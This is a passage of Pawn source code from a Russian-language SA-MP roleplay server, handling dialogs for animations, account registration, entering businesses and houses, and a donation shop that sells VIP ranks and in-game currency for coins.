			case 21: ApplyAnimation(playerid, "PED", "DOOR_LHinge_O", 4.1, 0, 1, 1, 1, 1 ,1);
			case 22: ApplyAnimation(playerid, "PED", "FLOOR_hit", 4.1, 0, 0, 0, 1, 1, 1);
			case 23: ApplyAnimation(playerid, "PED", "FLOOR_hit_f", 4.1, 0, 0, 0, 1, 1, 1);
			case 24: ApplyAnimation(playerid, "PED", "run_right", 4.1, 1, 1, 1, 1, 1 ,1);
			case 25: ApplyAnimation(playerid, "PED", "SEAT_down", 4.1, 0, 0, 0, 1, 1 ,1);
			case 26: ApplyAnimation(playerid, "PED", "WALK_drunk", 4.1, 1, 1, 1, 1, 1 ,1);
			}
			return ShowPlayerDialogEx(playerid, 1994, DIALOG_STYLE_LIST, "AnimList", "[0] Dance 0\n[1] Dance 1\n[2] Dance 2\n[3] Dance 3\n[4] Dance 4\n[5] Smoking\n[6] Sunbathe1\n[7] Sunbathe2\n[8] Crack1\n[9] Crack2\n[10] Crack3\n[11] Crack4\n[12] Crack5\n[13] Crack6\n[14] Crack7\n[15] Crack8\n[16] Crack9\n[17] Dealer\n[18] Ped\n[19] Руки вверх\n[20] Ped1\n[21] Ped2\n[22] Ped3\n[23] Ped4\n[24] Ped5\n[25] Ped6\n[26] Ped7", "Готово", "Отмена");
		}
	case 2:
		{
			if(response)
			{
				if(!strlen(inputtext))
				{
					format(string,527, "{FFFFFF}Приветствую на сервере {AE433D}%s\n{FFFFFF}Регистрация нового персонажа.\n\n{FFFFFF}Логин: %s\nВведите Пароль:\n\n{FFA500}Примечание:\n{FFA500}- {FFFFFF}Пароль должен состоять от 6-ти до 32-ух символов\n{FFA500}- {FFFFFF}Пароль должен состоять из латинских символов и цифр\n{FFA500}- {FFFFFF}Пароль должен подходить для любого регистра", NameServer, PlayerInfo[playerid][pName]);
					ShowPlayerDialogEx(playerid,2,DIALOG_STYLE_INPUT, "{AE443D}Регистрация | {FFFFFF}Ввод пароля",string, "Далее", "Отмена");
					return true;
				}
				if(!strlen(inputtext) || strlen(inputtext) < 6 || strlen(inputtext) > 32)
				{
					return ShowPlayerDialogEx(playerid,2,DIALOG_STYLE_MSGBOX, "{FF6347}Ошибка", "{FFFFFF}Длина пароля должна быть от 6 до 32 символов", "Повторить", "");
				}
				for(new i = strlen(inputtext); i != 0; --i)
				switch(inputtext[i])
				{
				case 'А'..'Я', 'а'..'я', ' ':
					return ShowPlayerDialogEx(playerid,2,DIALOG_STYLE_MSGBOX, "{FF6347}Ошибка", "{FFFFFF}Пароль должен состоять из латинских символов или цифр", "Повторить", "");
				}
				strmid(PlayerInfo[playerid][pKey],inputtext, 0, strlen(inputtext), 32);
				PlayerPlaySound(playerid, 1097, 0.0, 0.0, 0.0);
				new rulesdialog[1300];
				format(rulesdialog,sizeof(rulesdialog), "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
				RulesMSG[0],RulesMSG[1],RulesMSG[2],RulesMSG[3],RulesMSG[4],RulesMSG[5],RulesMSG[6],RulesMSG[7],RulesMSG[8],RulesMSG[9],RulesMSG[10],RulesMSG[11],RulesMSG[12],RulesMSG[13],RulesMSG[14],RulesMSG[15],RulesMSG[16]);
				ShowPlayerDialogEx(playerid,12,DIALOG_STYLE_MSGBOX, "{AE443D}Регистрация | {FFFFFF}Правила Сервера", rulesdialog, "Согласен", "Выйти");
				return true;
			}
			else
			{
				SCM(playerid, COLOR_LIGHTRED, "Вы были отключены от сервера! Чтобы выйти введите /q(uit)");
				Kick(playerid);
			}
		}
	case 9898:
		{
			if(!response) return true;
			for(new i = 1; i <= TotalBizz; i++)
			{
				if (PlayerToPoint(3, playerid,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]) && BizzInfo[i][bType] != 4)
				{
					if(PlayerInfo[playerid][pCash] < BizzInfo[i][bEntranceCost])
					{
						SCM(playerid, COLOR_GRAD1, " У вас нет столько денег");
						return true;
					}
					PickupX[playerid] = BizzInfo[i][bExitX], PickupY[playerid] = BizzInfo[i][bExitY];
					oldpickup[playerid] = BizzInfo[i][bEnterPic];
					timepickup[playerid] = 8;
					PlayerInfo[playerid][pCash] -=BizzInfo[i][bEntranceCost];
					BizzInfo[i][bTill] += BizzInfo[i][bEntranceCost];
					BizzPay[i] += BizzInfo[i][bEntranceCost];
					SetPlayerInterior(playerid,BizzInfo[i][bInterior]);
					SetPlayerPos(playerid,BizzInfo[i][bExitX],BizzInfo[i][bExitY],BizzInfo[i][bExitZ]);
					SetPlayerVirtualWorld(playerid,BizzInfo[i][bVirtualWorld]);
					enterbiz[playerid] = i;
					return true;
				}
			}
		}
	case 10075: // Вход в красный дом
		{
			if(!response) return true;
			for(new i = 1; i <= TotalHouse; i++)
			{
				if (PlayerToPoint(3, playerid,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]))
				{
	  					switch(HouseInfo[i][hKlass])
					    {
			      			case 0: // Дом N Klass
				        	{
								CallLocalFunction("OnPlayerCommandText", "is", playerid, "/enter");
							}
							case 1: // Дом D Klass
							{
								CallLocalFunction("OnPlayerCommandText", "is", playerid, "/enter");
							}
							case 2..5: // Дома от C класса до домов S класса
							{
			    				ShowPlayerDialogEx(playerid, 1006, 2, "Вход","Войти в дом\nВойти в гараж", "Готово", "Отмена");
							}
						}
				}
			}
		}
	case 10026: // Вход в зеленый дом
		{
			if(!response) return true;
			for(new i = 1; i <= TotalHouse; i++)
			{
				if (PlayerToPoint(3, playerid,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]))
				{
		   			switch(HouseInfo[i][hKlass])
				    {
		      			case 0: // Дом N Klass
			        	{
							CallLocalFunction("OnPlayerCommandText", "is", playerid, "/enter");
						}
						case 1: // Дом D Klass
						{
							CallLocalFunction("OnPlayerCommandText", "is", playerid, "/enter");
						}
						case 2..5: // Дома от C класса до домов S класса
						{
		    				ShowPlayerDialogEx(playerid, 1006, 2, "Вход","Войти в дом\nВойти в гараж", "Готово", "Отмена");
						}
					}
				}
			}
		}
		case 1006: // Вход в дом / гараж от домов C-S классов
		{
		    switch(listitem)
			{
			    case 0: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/enter");
				case 1: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/enterg");
			}
		}
	case 1007: // Выйти на улицу / войти в дом
		{
			if(!response) return true;
			new i = GetPlayerVirtualWorld(playerid);
			switch(listitem)
			{
				case 0: // Выйти на улицу
				{
					PickupX[playerid] = HouseInfo[i-100][hEntrancex], PickupY[playerid] = HouseInfo[i-100][hEntrancey];
					oldpickup[playerid] = HouseInfo[i-100][hPickup];
					timepickup[playerid] = 8;
					SetPlayerInterior(playerid,0);
					SetPlayerPos(playerid,HouseInfo[i-100][hEntrancex],HouseInfo[i-100][hEntrancey],HouseInfo[i-100][hEntrancez]);
					SetPlayerVirtualWorld(playerid,0);
				}
				case 1: // Войти в дом
				{
					SetPlayerInterior(playerid,HouseInfo[i-100][hInt]);
					SetPlayerPos(playerid,HouseInfo[i-100][hExitx],HouseInfo[i-100][hExity],HouseInfo[i-100][hExitz]);
					SetPlayerVirtualWorld(playerid,i-50);
				}
			}
		}
		case 1008: // Выйти на улицу / войти в гараж
		{
			if(!response) return true;
			switch(listitem)
			{
				case 0:
				{
	   				for(new i = 1; i <= TotalHouse; i++)
					{
						if(!PlayerToPoint(3, playerid,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz])) continue;
						if(GetPlayerVirtualWorld(playerid) == i+50)
						{
							PickupX[playerid] = HouseInfo[i][hEntrancex], PickupY[playerid] = HouseInfo[i][hEntrancey];
							oldpickup[playerid] = HouseInfo[i][hPickup];
							timepickup[playerid] = 8;
							SetPlayerInterior(playerid,0);
							SetPlayerVirtualWorld(playerid,0);
							SetPlayerPos(playerid,HouseInfo[i][hEntrancex],HouseInfo[i][hEntrancey],HouseInfo[i][hEntrancez]);
							break;
						}
      				}
      			}
				case 1: CallLocalFunction("OnPlayerCommandText", "is", playerid, "/enterg"); // Войти в гараж
      		}
		}
	case 4:
		{
		    if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING) ac_TogglePlayerSpectating(playerid, 0);
			else SpawnPlayer(playerid);
			if(response)
			{
				PlayerInfo[playerid][pSex] = 1;
			}
			else
			{
				PlayerInfo[playerid][pSex] = 2;
			}
			PlayerInfo[playerid][pTut] = 0;
			PlayerInfo[playerid][pAdmin] = 0;
			//PlayerInfo[playerid][pHelper] = 0;
			ClothesRound[playerid] = 1;
			for(new i = 0; i < 7; i++) TextDrawShowForPlayer(playerid, Select_Skin_TD[i]);
			PlayerTextDrawShow(playerid, Select_Skin_PTD[playerid][0]);
		    SelectTextDraw(playerid, 0xFF6347AA);
			SetPVarInt(playerid,"Register",1);
			DelGun(playerid);
		}
	case 29322:
		{
			if(response)
			{
				switch(listitem)
				{
					 case 0:
					 {
   			             format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
						 {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
						 {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
						 {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
						 {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
						 {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
						 {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
						 {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
						 {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
						 {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
						 {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
						 {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
						 {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
						 {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
						 {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
						 PlayerInfo[playerid][pName],
						 PlayerInfo[playerid][pDonateMoney],
						 PlayerInfo[playerid][pDonateAccount]);
						 ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
					 }
					 case 1:
					 {
   			             format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
						 {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
						 {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
						 {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
						 {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
						 {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
						 {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
						 {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
						 {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
						 {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
						 {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
						 {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
						 {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
						 {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
						 {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
						 PlayerInfo[playerid][pName],
						 PlayerInfo[playerid][pDonateMoney],
						 PlayerInfo[playerid][pDonateAccount]);
						 ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
					 }
					 case 2:
					 {
                         ShowPlayerDialogEx(playerid,29323,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат | {AE443D}EVOLVE", "{FFFFFF}Наименование\tПараметр\n\
						 {FFFFFF}[0] {6EF83C}${FFFFFF}500000\t{F3FF02}200 {FFFFFF}COINS\n\
						 {FFFFFF}[1] {6EF83C}${FFFFFF}1000000\t{F3FF02}400 {FFFFFF}COINS\n\
						 {FFFFFF}[2] {6EF83C}${FFFFFF}2700000\t{F3FF02}1000 {FFFFFF}COINS\n\
						 {FFFFFF}[3] {6EF83C}${FFFFFF}5500000\t{F3FF02}2000 {FFFFFF}COINS\n\
						 {FFFFFF}[4] {6EF83C}${FFFFFF}8500000\t{F3FF02}3000 {FFFFFF}COINS\n\
						 {FFFFFF}[5] {6EF83C}${FFFFFF}12000000\t{F3FF02}4000 {FFFFFF}COINS\n\
						 {FFFFFF}[6] {6EF83C}${FFFFFF}26000000\t{F3FF02}8000 {FFFFFF}COINS\n\
						 {FFFFFF}[7] {6EF83C}${FFFFFF}55000000\t{F3FF02}16000 {FFFFFF}COINS", "Выбрать", "Назад");
					 }
					 case 3:
					 {
                          	if(PlayerInfo[playerid][pWarns] == 0) return SCM(playerid, COLOR_GRAD1, " У вас не имееются предупреждения!");
                            if(PlayerInfo[playerid][pDonateMoney] < 400)
						    {
						        SCM(playerid,COLOR_GREY,"Недостаточно COINS для снятия предупреждения");
                                format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
							    {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
							    {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
							    {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
							    {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
							    {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
							    {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
							    {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
							    {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
							    {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
							    {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
							    {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
							    {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
							    {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
							    {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
							    PlayerInfo[playerid][pName],
							    PlayerInfo[playerid][pDonateMoney],
							    PlayerInfo[playerid][pDonateAccount]);
							    ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
							    return true;
						    }
  						    PlayerInfo[playerid][pDonateAccount] += 400;
						    PlayerInfo[playerid][pDonateMoney] -= 400;
							PlayerInfo[playerid][pWarns] = 0;
							PlayerInfo[playerid][punWarns] = 0;
							PlayerInfo[playerid][OffWarns] = 0;
	                        SCM(playerid, COLOR_GREEN,"Вы приобрели снятие предупреждение с аккаунта за {F3FF02}400 {FFFFFF}COINS!");
				      	    mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pWarns = '%i', punWarns = '%i', OffWarns = '%i', pDonateMoney = '%i', pDonateAccount = '%i' WHERE name = '%e'", PlayerInfo[playerid][pWarns], PlayerInfo[playerid][punWarns], PlayerInfo[playerid][OffWarns], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pName]);
	                        mysql_function_query(DATABASE,QUERY,false,"","");
                            format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
						    {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
						    {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
						    {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
						    {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
						    {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
						    {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
						    {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
						    {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
						    {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
						    {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
						    {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
						    {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
						    {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
						    {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
						    PlayerInfo[playerid][pName],
						    PlayerInfo[playerid][pDonateMoney],
						    PlayerInfo[playerid][pDonateAccount]);
						    ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
					 }
					 case 4:
					 {
                          if(PlayerInfo[playerid][pDonateMoney] < 1000)
						  {
						      SCM(playerid,COLOR_GREY,"Недостаточно COINS для покупки VIP BRONZE");
                              format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
							  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
							  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
							  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
							  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
							  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
							  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
							  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
							  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
							  PlayerInfo[playerid][pName],
							  PlayerInfo[playerid][pDonateMoney],
							  PlayerInfo[playerid][pDonateAccount]);
							  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
							  return true;
						  }
						  PlayerInfo[playerid][pDonateAccount] += 1000;
						  PlayerInfo[playerid][pDonateMoney] -= 1000;
	 				      PlayerInfo[playerid][pDonateRank] = 1;
	 				      PlayerInfo[playerid][pBank] += 500000;
	 				      GameTextForPlayer(playerid, "~g~+500.000$", 2000, 1);
					      SCM(playerid, COLOR_GREEN,"Вы приобрели VIP BRONZE за {F3FF02}1000 {FFFFFF}COINS!");
				      	  mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pDonateRank = '%i', pDonateMoney = '%i', pDonateAccount = '%i', pCash = '%i' WHERE name = '%e'", PlayerInfo[playerid][pDonateRank], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pBank], PlayerInfo[playerid][pName]);
	                      mysql_function_query(DATABASE,QUERY,false,"","");
                          format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
						  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
						  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
						  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
						  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
						  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
						  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
						  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
						  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
						  PlayerInfo[playerid][pName],
						  PlayerInfo[playerid][pDonateMoney],
						  PlayerInfo[playerid][pDonateAccount]);
						  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
					 }
 					 case 5:
					 {
	                      if(PlayerInfo[playerid][pDonateMoney] < 2000)
						  {
						      SCM(playerid,COLOR_GREY,"Недостаточно COINS для покупки VIP SILVER");
                              format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
							  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
							  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
							  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
							  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
							  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
							  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
							  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
							  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
							  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
							  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
							  {FFFFFF}[13] Приобрести ''Навык таксиста''\t{F3FF02}500 {FFFFFF}COINS",
							  PlayerInfo[playerid][pName],
							  PlayerInfo[playerid][pDonateMoney],
							  PlayerInfo[playerid][pDonateAccount]);
							  ShowPlayerDialogEx(playerid,29322,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Донат [ {AE443D}/viphelp{FFFFFF} ] | {AE443D}EVOLVE", string, "Выбрать", "Отмена");
							  return true;
						  }
						  PlayerInfo[playerid][pDonateAccount] += 2000;
						  PlayerInfo[playerid][pDonateMoney] -= 2000;
	 				      PlayerInfo[playerid][pDonateRank] = 2;
	 				      PlayerInfo[playerid][pBank] += 1000000;
	 				      GameTextForPlayer(playerid, "~g~+1.000.000$", 2000, 1);
					      SCM(playerid, COLOR_GREEN,"Вы приобрели {00FFEE}VIP{FFFFFF} SILVER за {F3FF02}2000 {FFFFFF}COINS!");
				      	  mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pDonateRank = '%i', pDonateMoney = '%i', pDonateAccount = '%i', pBank = '%i' WHERE name = '%e'", PlayerInfo[playerid][pDonateRank], PlayerInfo[playerid][pDonateMoney], PlayerInfo[playerid][pDonateAccount], PlayerInfo[playerid][pBank], PlayerInfo[playerid][pName]);
	                      mysql_function_query(DATABASE,QUERY,false,"","");
                          format(string, 2500, "{FFFFFF}Наименование\tСтоимость\n\
						  {FFFFFF}[0] Пользователь\t\t{AE443D}%s{FFFFFF}\n\
						  {FFFFFF}[1] {F3FF02}GOLD {FFFFFF}COINS\t\t{AE443D}%i/%i{FFFFFF}\n\
						  {FFFFFF}[2] Конвентировать в игровую валюту\t{F3FF02}200+ {FFFFFF}COINS\n\
						  {FFFFFF}[3] Снять предупреждение\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[4] Приобрести VIP BRONZE [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}1000 {FFFFFF}COINS\n\
						  {FFFFFF}[5] Приобрести {00FFEE}VIP{FFFFFF} SILVER [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}2000 {FFFFFF}COINS\n\
						  {FFFFFF}[6] Приобрести {F3FF02}VIP{FFFFFF} GOLD [ {AE443D}Навсегда{FFFFFF} ]\t{F3FF02}3000 {FFFFFF}COINS\n\
						  {FFFFFF}[7] Вылечиться от наркозависимости\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[8] Приобрести ''Наркозависимость''\t{F3FF02}400 {FFFFFF}COINS\n\
						  {FFFFFF}[9] Приобрести ''Комплект лицензий''\t{F3FF02}200 {FFFFFF}COINS\n\
						  {FFFFFF}[10] Приобрести ''Навык стрельбы''\t{F3FF02}300 {FFFFFF}COINS\n\
						  {FFFFFF}[11] Приобрести ''Законопослушность''\t{F3FF02}600 {FFFFFF}COINS\n\
						  {FFFFFF}[12] Приобрести ''Навык дальнобойщика''\t{F3FF02}2000 {FFFFFF}COINS\n\
